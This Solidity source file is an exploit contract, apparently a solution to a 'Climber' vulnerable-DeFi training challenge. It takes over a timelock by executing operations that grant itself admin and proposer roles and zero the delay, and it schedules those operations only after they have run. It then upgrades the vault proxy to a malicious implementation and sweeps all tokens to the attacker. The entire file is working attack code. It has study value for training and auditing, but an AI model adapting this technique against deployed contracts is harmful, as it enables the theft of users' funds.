// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './ClimberTimelock.sol';
import './ClimberVault.sol';
import './MaliciousClimberVault.sol';
import '@openzeppelin/contracts/access/AccessControl.sol';

/**
 * @title ClimberTimelockThief
 * @author Patate
 */
contract ClimberTimelockThief {
    uint256 public constant ATTACK_STEPS = 4;
    bytes32 public constant ADMIN_ROLE = keccak256('ADMIN_ROLE');
    bytes32 public constant PROPOSER_ROLE = keccak256('PROPOSER_ROLE');

    address public immutable owner;
    ClimberTimelock public immutable timelock;
    ClimberVault public immutable vault;
    IERC20 public immutable token;

    constructor(
        ClimberTimelock _timelock,
        ClimberVault _vault,
        IERC20 _token
    ) {
        owner = msg.sender;
        timelock = _timelock;
        vault = _vault;
        token = _token;
    }

    function drain() external {
        _stealOwnership();
        MaliciousClimberVault maliciousVault = new MaliciousClimberVault();

        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory dataElements = new bytes[](1);
        bytes32 salt = '';

        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(maliciousVault));

        timelock.schedule(targets, values, dataElements, salt);
        timelock.execute(targets, values, dataElements, salt);

        MaliciousClimberVault(address(vault)).sweepFunds(address(token), owner);
    }

    function _stealOwnership() private {
        address[] memory targets = new address[](ATTACK_STEPS);
        uint256[] memory values = new uint256[](ATTACK_STEPS);
        bytes[] memory dataElements = new bytes[](ATTACK_STEPS);
        bytes32 salt = '';

        // Step 1: reduce delay between proposals to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        // Step 2: become owner
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, ADMIN_ROLE, address(this));

        // Step 3: timelock needs to be a proposer
        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(this));

        // Step 4: propose the txs I just executed
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(ClimberTimelockThief.schedule.selector);

        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() external {
        require(msg.sender == address(timelock));

        address[] memory targets = new address[](ATTACK_STEPS);
        uint256[] memory values = new uint256[](ATTACK_STEPS);
        bytes[] memory dataElements = new bytes[](ATTACK_STEPS);
        bytes32 salt = '';

        // Step 1: reduce delay between proposals to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        // Step 2: become owner
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, ADMIN_ROLE, address(this));

        // Step 3: become proposer
        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(this));

        // Step 4: propose the txs I just executed
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(ClimberTimelockThief.schedule.selector);

        timelock.schedule(targets, values, dataElements, salt);
    }
}
